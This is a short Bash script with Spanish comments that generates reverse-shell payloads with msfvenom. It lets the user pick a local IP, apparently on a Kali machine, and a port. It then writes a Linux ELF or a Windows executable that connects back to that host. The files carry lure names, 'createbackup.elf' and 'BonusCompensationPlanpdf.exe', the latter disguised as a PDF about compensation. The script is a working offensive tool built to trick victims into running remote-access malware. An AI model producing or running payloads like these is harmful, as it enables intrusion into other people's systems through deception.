#!/usr/bin/env bash

# Obtener IPs disponibles y filtrar vacíos
mapfile -t IPS < <(hostname -I | tr ' ' '\n' | grep -v '^$')

echo "--- IPs Disponibles ---"
for i in "${!IPS[@]}"; do
    echo "$((i+1)). ${IPS[$i]}"
done

# Selección de IP
read -p "Selecciona el número de la IP: " IP_CHOICE
KALI_IP=${IPS[$((IP_CHOICE-1))]}

if [ -z "$KALI_IP" ]; then
    echo "Selección inválida."
    exit 1
fi

echo "IP seleccionada: $KALI_IP"
echo "-----------------------"

# Selección de puerto (default 443)
read -p "Puerto a usar [443] (Enter para default): " LPORT
LPORT="${LPORT:-443}"
if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || (( LPORT < 1 || LPORT > 65535 )); then
    echo "Puerto inválido: $LPORT (debe ser un número entre 1 y 65535)."
    exit 1
fi

# Selección de OS
echo "Elige el sistema operativo target:"
echo "1. Linux (x64)"
echo "2. Windows"
read -p "Selección [1-2]: " OS_CHOICE

case $OS_CHOICE in
    1)
        echo "Generando payload Linux..."
        msfvenom -p linux/x64/shell_reverse_tcp LHOST="$KALI_IP" LPORT="$LPORT" -f elf > createbackup.elf
        echo "Archivo creado: createbackup.elf"
        ;;
    2)
        echo "Generando payload Windows..."
        msfvenom -p windows/shell_reverse_tcp LHOST="$KALI_IP" LPORT="$LPORT" -f exe > BonusCompensationPlanpdf.exe
        echo "Archivo creado: BonusCompensationPlanpdf.exe"
        ;;
    *)
        echo "Opción no válida."
        exit 1
        ;;
esac
